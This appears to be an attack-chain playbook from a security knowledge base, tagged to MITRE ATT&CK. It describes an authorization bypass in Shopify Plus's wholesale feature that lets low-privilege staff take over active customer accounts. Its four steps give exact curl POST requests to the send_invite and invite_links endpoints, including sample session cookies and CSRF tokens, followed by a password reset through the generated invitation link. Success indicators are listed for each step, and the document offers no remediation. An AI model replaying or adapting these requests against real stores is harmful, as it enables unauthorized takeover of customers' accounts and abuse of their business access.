---
tags:
  - shopify
  - authorization-bypass
  - account-takeover
  - api-exploit
type: attack_chain
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
  - '[[Persistence]]'
verified: false
platforms:
  - Web
  - Shopify
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Access-Shopify-Wholesale-Admin-and-Identify-Targets]]'
  - '[[procedures/Bypass-UI-Restrictions-with-Send-Invite-API]]'
  - '[[procedures/Generate-Invitation-Link-via-API]]'
step_count: 4
techniques:
  - '[[Valid Accounts]]'
  - '[[Account Manipulation]]'
updated_at: '2025-12-14T17:30:18.659Z'
description: >-
  Low-privilege staff accounts bypass UI restrictions in Shopify's wholesale
  feature to generate invitation links for active customer accounts, enabling
  password reset and full account takeover.
skill_level: intermediate
impact_level: high
id: 43645db5-e6de-4577-b5f5-34f25b3e0675
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Persistence]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Account Manipulation]]'
---
# Shopify-Wholesale-Staff-Authorization-Bypass-for-Account-Takeover

Multi-stage attack chain demonstrating how low-privilege staff in Shopify Plus can exploit API endpoints in the wholesale feature to generate invitation links for already activated customer accounts, bypassing UI protections and enabling account takeover via password reset.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access: Login as Staff] --> B[Discovery: Identify Active Accounts]
    B --> C[Execution: Bypass Send Invite]
    C --> D[Persistence: Generate Invite Link]
    D --> E[Impact: Account Takeover]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
    style E fill:#e67e22
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Burp-Suite]]

### Target Environment

- Shopify Plus with Wholesale feature enabled
- Access to admin panel via web browser
- No specific ports; operates over HTTPS

### Initial Access Requirements

- Valid staff credentials with 'apps and channels' or wholesale permissions
- Network access to Shopify admin (wholesale.shopifyapps.com)
- Burp Suite proxy configured for request interception

## Detailed Attack Procedures

### Step 1: Access Admin and Identify Targets
procedure: [[procedures/Access-Shopify-Wholesale-Admin-and-Identify-Targets]]

**Objective**: Log in as low-privilege staff and locate active wholesale customer accounts that cannot be targeted via UI.

**Instructions**: Log in to the Shopify admin panel using staff credentials. Navigate to the wholesale customers section to view the list of accounts, noting those with 'Enabled' status where UI invite features are disabled.

**Expected Output**: List of active customer accounts with IDs, UI errors confirming blocks on invite actions.

**Success Indicators**:
- Successful login without elevated permissions
- Identification of at least one enabled account ID (e.g., 5182518)
- UI errors like 'Cannot send invite to enabled account'

### Step 2: Bypass UI for Send Invite
procedure: [[procedures/Bypass-UI-Restrictions-with-Send-Invite-API]]

**Objective**: Intercept a UI attempt and modify it into a direct API call to the send_invite endpoint, bypassing status checks.

**Instructions**: Configure Burp Suite to intercept traffic. Attempt a UI invite action to capture the request, then replay a modified POST to `/admin/shops/{shop_id}/accounts/{account_id}/send_invite` using [[commands/shopify-send-invite-post]] with the target account ID.

```bash
# Use Burp or curl equivalent for POST request
curl -X POST 'https://wholesale.shopifyapps.com/admin/shops/19596/accounts/5182518/send_invite' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: _y=89dc5b45-EA1A-44DA-7630-F0F7AA8DFC4A; ...' \
  -d 'authenticity_token=qHWmHVuCLbQOWT2cCElOvv%2BAQoHz4AvsMdVzW8zkjiTemE5jx2q7IdeX9nfSnVHA45fbdXVx4oo%2FYhU%2FpnnW8Q%3D%3D'
```

**Expected Output**: HTTP 200 or similar success response preparing the invite (no error for enabled account).

**Success Indicators**:
- No authorization error from API
- Request completes without UI block

### Step 3: Generate Invitation Link
procedure: [[procedures/Generate-Invitation-Link-via-API]]

**Objective**: Follow up with a POST to the invite_links endpoint to retrieve the usable invitation link for account takeover.

**Instructions**: Immediately after the send_invite success, send a POST to `/admin/shops/{shop_id}/accounts/{account_id}/invite_links` using [[commands/shopify-invite-links-post]], including CSRF token and XMLHttpRequest headers.

```bash
# Use Burp or curl equivalent for POST request
curl -X POST 'https://wholesale.shopifyapps.com/admin/shops/19596/accounts/5182518/invite_links' \
  -H 'X-Csrf-Token: 8TESa0/8klTiTrM0zMpVyEmoGvady47gKvvExY9jFYuH3PoV0xQEwTuAeN8WHkq2Vb+DAhtaZ4YkTKKh5f5NXg==' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'Cookie: _y=89dc5b45-EA1A-44DA-7630-F0F7AA8DFC4A; ...'
```

**Expected Output**: HTTP 201 Created with JSON containing 'invite_link' like https://.../accounts/invitation/accept?invitation_token=█████.

**Success Indicators**:
- Invitation link received in response
- Link can be used to reset password and access the account

### Step 4: Execute Account Takeover

**Objective**: Use the generated link to reset the victim's password and gain control of their wholesale account.

**Instructions**: Open the invitation link in a browser, follow the reset process to set a new password, and log in as the victim.

**Expected Output**: Successful password reset and login to the victim's account.

**Success Indicators**:
- Access to victim's wholesale dashboard
- Ability to perform actions as the compromised account

## Attack Chain Summary

### Key Achievements

1. Bypassed UI restrictions using direct API calls with low-privilege staff account
2. Generated functional invitation links for enabled customers, evading backend status checks
3. Achieved full account takeover via password reset, compromising wholesale access

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Valid Accounts]] Valid Accounts
- [[Account Manipulation]] Account Manipulation

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Persistence]] Persistence

---

*Last updated: 2023-10-01T00:00:00Z*
